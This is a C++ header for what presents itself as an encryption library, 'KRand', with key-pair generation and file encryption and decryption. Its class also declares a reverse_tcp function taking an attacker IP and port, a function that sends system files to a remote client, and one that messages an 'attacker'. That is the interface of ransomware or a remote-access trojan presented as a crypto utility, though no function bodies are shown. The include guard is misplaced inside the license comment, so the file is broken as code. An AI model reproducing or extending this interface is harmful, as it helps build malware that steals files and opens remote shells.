/***
MIT License

Copyright (c) 2025 Kalasaikamesh944

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
#ifndef KRAND_H
#define KRAND_H
***/
#include <iostream>
#include <string>

#ifdef _WIN32
    #include <winsock2.h>
    #pragma comment(lib, "ws2_32.lib")  // Windows Sockets
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif

std::string kala_time_key();
std::string kala_encrypt(const std::string &plaintext, const std::string &key);
std::string kala_decrypt(const std::string &ciphertext, const std::string &key);

class KRand {
public:
    KRand();
    ~KRand();

    void generate_key_pair(const std::string &public_key_file, const std::string &private_key_file);
    std::string encrypt_with_public_key(const std::string &data, const std::string &public_key_file);
    std::string decrypt_with_private_key(const std::string &encrypted_data, const std::string &private_key_file);
    void encrypt_file(const std::string &input_file, const std::string &output_file, const std::string &public_key_file);
    void decrypt_file(const std::string &input_file, const std::string &output_file, const std::string &private_key_file);
    void send_system_files_to_client(const std::string &client_ip, int client_port); // Add this line
    void reverse_tcp(const std::string &attacker_ip, int attacker_port);
    void send_message_to_attacker(const std::string &attacker_ip, int attacker_port, const std::string &message);
};

#endif  // KRAND_H
